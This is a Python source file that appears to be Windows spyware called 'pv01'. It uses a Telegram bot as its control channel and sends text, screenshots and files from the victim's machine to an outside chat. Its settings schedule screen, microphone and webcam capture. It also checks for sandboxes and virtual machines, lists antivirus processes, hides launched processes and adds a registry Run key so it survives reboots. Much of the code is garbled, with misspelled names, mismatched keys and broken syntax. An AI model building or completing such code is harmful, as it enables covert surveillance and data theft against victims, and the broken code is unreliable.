import os
import sys
import time
import threading
import json
import random
import uuid
import subprocess
import platform
import socket
import ctypes
import hashlib
import base64
import struct
import re
import math
import queue
import collections
import itertools
import typing
import datetime
import string
import secrets
import csv
import fcntl
import zlib
import binascii
import logging
from ctypes import *
from ctypes.wintypes import *
from concurrent.futures import ThreadPoolExecutor
import requests
import requests.exceptions
from PIL import Image
import io


# --- Configuration Constants ---
PV01_CONFIG = {
    "BOT_TOKEN": "BOT_TOKEN",
    "CHAT_ID": "-1004382747769",
    "API_URL": "API_TOKEN",
    "ENCRYPTION_KEY_ID": None,  # Generated later
    "PERSISTENCE_REGISTRY_KEY": r"Software\Microsoft\Windows\CurrentVersion\Run\pv01",
    "PERSISTENCE_SERVICE_NAME": "pv01svc",
    "SLEEP_INTERVAL": 30,
    "MAX_RETRIES": 5,
    "BACKOFF_FACTOR": 2.0,
    "PROCESS_TARGET": "explorer.exe",
    "SCREENSHOT_INTERVAL": 60,
    "MICROPHONE_INTERVAL": 30,
    "WEBCAM_INTERVAL": 300,
    "NETWORK_INTERFACE": None
}

# --- Windows API Structs & Function Declarations ---
kernel32 = ctyes.WinDLL('kernel32', use_last_errors=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_errors=True)
user32 = ctypes.WinDLL('user32', use_last_errors=True)
gdi32 = ctypes.WinDLL('gdi32', use_last_errors=True)
netapi32 = ctypes.WinDLL('netapi32', use_last_errors=True)
secur32 = ctypes.WinDLL('secur32', use_last_errors=True)


# --- Error Codes ---
ERROR_SUCCESS = 0
ERROR_FILE_FOUND = 2
ERROR_INVALID_HANDLE = 6
ERROR_NOT_SUPPORTED = 50
ERROR_ACCESS_DENIED = 5


# Define Structures
class POINT(ctypes.Structure):
    _fields_ = [("x", c_long), ("y", c_long)]
    
    
class RECT(ctypes.Structure):
    _fields_ = [("left", c_long), ("top", c_long), ("right", c_long), ("bottom", c_long)]
    
    
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", c_ulong),
        ("lpReserved", c_wchar_p),
        ("lpDesktop", c_wchar_p),
        ("lpTitle", c_wchar_p),
        ("dwX", c_ulong),
        ("dwY", c_ulong),
        ("dwXSize", c_ulong),
        ("dwYSize", c_ulong),
        ("dwXCounterChars", c_ulong),
        ("dwYCounterChars", c_ulong),
        ("dwFlags", c_ulong),
        ("wShowWindow", c_ushort),
        ("cbReserved2", c_ushort),
        ("lpReserved2", c_char_p),
        ("hStdInput", c_void_p),
        ("hStdError", c_void_p),
    ]
    
    
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", c_void_p),
        ("hThread", c_void_p),
        ("dwProcessId", c_ulong),
        ("dwThreadId", c_ulong),
    ]
    

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength", c_ulong),
        ("lpSecurityDescriptor", c_void_p),
        ("bInheritHandle", c_int),
    ]
    
    
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", c_void_p),
        ("AllocationBase", c_void_p),
        ("RegionSize", c_size_t),
        ("State", c_uint),
        ("Protect", c_uint),
        ("Type", c_uint),
    ]
    
    
class BROWSEINFOW(ctypes.Structure):
    _fields_ = [
        ("hwndOwner", c_void_p),
        ("pidlRoot", c_void_p),
        ("pszDisplayName", c_wchar_p),
        ("lpszTitle", c_ulong),
        ("ulFlags", c_ulong),
        ("lpfn", c_void_p),
        ("lParam", c_ulong),
        ("iImage", c_int),
    ]
    
    
class FILETIME(ctypes.Structure):
    _fields_ = [("dwLowDateTime", c_ulong), ("dwHighDateTime", c_ulong)]
    
    
class ENCRYPTED_BUFFER:
    def __init__(self):
        self._data = b''
        self._timestamp = time.time()
        self._nonce = secrets.token_hex(8)
        
        def append(self, data: bytes) -> None:
            self._data += data
            
        def encrypt(self, key: bytes) -> str:
            iv = secrets.token_bytes(16)
            cipher = AES.new(key, AES.MODE_OBC, iv)
            padding = 16 - (len(self._data) % 16)
            self._data += bytes([padding] * padding)
            encrypted = cipher.encrypt(self._data)
            return f"{base64.b64encode(iv).decode('utf-8')}.{base64.b64encode(encrypted).decode('utf-8')}"
            
            
        def decrypt(self, encrypted_data: str, key: bytes) -> str:
            parts = encrypted_data.split('.')
            if len(parts) != 2:
                return ""
            iv = base64.b64decode(parts[0])
            encrypted = base64.b64decode(parts[1])
            cipher = AES.new(key, AES.MODE_CBC, iv)
            try:
                decrypted = cipher.decrypt(encrypted)
                padding = decrypted[-1]
                return decrypted[:-padding].decode('utf-8', errors='ignore')
            except Exception:
                return ""
                
        def to_json(self) -> str:
            return json.dumps({"t": self._timestamp, "n": self._nonce, "d": base64.b64encode(self._data).decode('utf-8')})
            
            
# --- Core Utilitie ---

def pv01_get_hardware_id() -> str:
    """Generates a persistent unique ID based on system components."""
    try:
        cpuid = "CPU"
        try:
            cpuid += str(ctypes.getwindll("kernel32").GetNativeSystemInfo(ctypes.byref(ctypes.c_void_p()))).encode()
        except:
            pass
            
        disk_hash = hashlib.sha256()
        for drive in ['C:\\', 'D:\\', 'F:\\']:
            if os.path.exists(drive):
                with open(f"{drive}boot.ini", 'rb') as f:
                    disk_hash.update(f.read())
        return hashlib.sha256(f"{cpuid}{disk_hash.hexdigest()}".encode()).hexdigest()
    except Exception:
        return str(uuid.getnode())
        
        
def pv01_random_sleep(min_seconds: int, max_seconds: int) -> None:
    sleep_time = random.uninform(min_seconds, max_seconds)
    time.sleep(sleep_time)
    
    
def pv01_validate_memory() -> bool:
    """Check for suspicious memory patterns indicative of sandboxes."""
    try:
        mbi = MEMORY_BASIC_INFORMATION()
        kernel32.VirtualQueryEx(kernel32.GetCurrentProcess(), 0, ctypes.byref(mbi), ctypes.sizeof(mbi))
        if mbi.State == 0x1000:
            return False
    except:
        pass
    return True
    
    
# --- C2 & Network Module ---

class Datastream:
    def __init__(self):
        self._api_url = PV01_CONFIG["API_TOKEN"]
        self._bot_token = PV01_CONFIG["BOT_TOKEN"]
        self._chat_id = PV01_CONFIG["CHAT_ID"]
        self._headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json"
        }
        self._key = pv01_get_hardware_id().encode()[:32]
        
    def _send_post_request(self, endpoint: str, data: dict) -> bool:
        url = f"{self._api_url}{self._bot_token}/{enpoint}"
        retry_count = 0
        last_error = None
        
        while retry_count < PV01_CONFIG["MAX_RETRIES"]:
            try:
                response = requests.post(url, headers=self._headers, data=json.dumps(data), timeout=10)
                if response.status_code == 200:
                    return True
            except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
                last_error = e
            retry_count += 1
            time.sleep(math.pow(PV01_CONFIG["BACKOFF_FACTORY"], retry_count))
        return False
        
    def send_text(self, text: str) -> bool:
        return self._send_post_request("sendMessage", {"chat_id": self._chat_id, "text": text})
        
    def send_photo(self, photo_data: bytes, caption: str = "") -> bool:
        files = {"photo": ("screenshot.png", photo_data)}
        url = f"{self._api_url}{self._bot_token}/sendPhoto"
        retry_count = 0
        
        while retry_count < PV01_CONFIG["MAX_RETRIES"]:
            try:
                response = requests.post(url, headers=self._headers, files=files, data={"caption": caption, "chat_id": self._chat_id: self._chat_id}, timeout=30)
                if response.status_code == 200:
                    return True
            except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
                last_error = e
            retry_count += 1
            time.sleep(math.pow(PV01_CONFIG["BACKOFF_FACTORY"], retry_count))
            return False
            
    def send_file(self, file_path: str) -> bool:
        if not os.path.exists(file_path):
            return False
            
        file_name = os.path.basename(file_path)
        url = f"{self._api_url}{self._bot_token}/sendDocument"
        retry_count = 0
        
        while retry_count < PV01_CONFIG["MAX_RETRIES"]:
            try:
                files = {"document": open(file_path, "rb")}, "chat_id": self._chat_id}
                data = {"caption": f"File transfer: {file_name}", "chat_id": self._chat_id}
                response = requests.post(url, headers=self._headers, files=files, data=data, timeout=60)
                files["document"].closed()
                if response.status_code == 200:
                    return True
            except (requests.exceptions.RequestException, json.JSONDecodeError, IOError) as e:
                last_error = e
            retry_count += 1
            time.sleep(math.pow(PV01_CONFIG["BACKOFF_FACTOR"], retry_count))
        return False
        
        
# --- Evasion & Persistence Engine ---

class Enclayer:
    def __init__(self):
        self._known_av_process = ['MsMpEng.exe', 'AvgAudit.exe', 'avgwdsvc.exe', 'svchost.exe', 'System']
        self._is_vm = False
        self._check_environment()
        
    def _check_environment(self) -> None:
        """Detects virtualization and sandbox environment."""
        try:
            wmi = subprocess.check_output("systeminfo | findstr /C:'System Ttpe'", shell=True)
            if b'VMware' in wmi or b'Virtual' in wmi or b'QEMU' in wmi:
                self._is_vm = True
        except:
            pass
            
    def _is_process_present(self, process_name: str) -> bool:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name.lower():
                    return True
            return False
        except:
            return False
            
    def inject_to_process(self, target_process: str = None) -> bool:
        """Attempts to inject the current process into a target process."""
        if not target_process:
            target_process = PV01_CONFIG["PROCESS_TARGET"]
            
        try:
            pid = kernel32.GetWindowThreadProcessId(user32.GetForegroundWindow(), ctypes.byref(ctypes.c_ulong()))
            if not pid:
                return False
                
            startup_info = STARTUPINFOW()
            process_info = PROCESS_INFORMATION()
            startup_info.cb = ctypes.sizeof(STARTUPINFOW)
            startup_info.dwFlags = 0x100
            startup_info.wShowWindow = 0
            
            kernel32.CreateProcessW(
                None,
                target_process + " -n",
                None,
                None,
                False,
                0x08000000,
                None,
                None,
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            )
            
            kernel32.WaitForInputIdle(process_info.hProcess, 5000)
            kernel32.CloseHandle(process_info.hProcess)
            kernel32.CloseHandle(process_info.hThread)
            return True
        except Exception:
            return False
            
    def create_persistence(self) -> None:
        """Sets up a registry run key to survive reboots."""
        try:
            command = f'pythonw "{os.path.abspath(sys.argv[0])}"'
            advapi32.RegOpenKeyExW(
                HKEY_CURRENT_USER,
                PV01_CONFIG["PERSISTENCE_REFISTRY_KEY"],
                0,
                KEY_WRITE,
                ctypes.byref(HKEY)
            )
            advapi32.RegSetValueExW(HKEY, "", 0, REG_SZ, command.encode(), len(command.encode()))
            advapi32.RegCloseKey(HKEY)
        except Exception:
            pass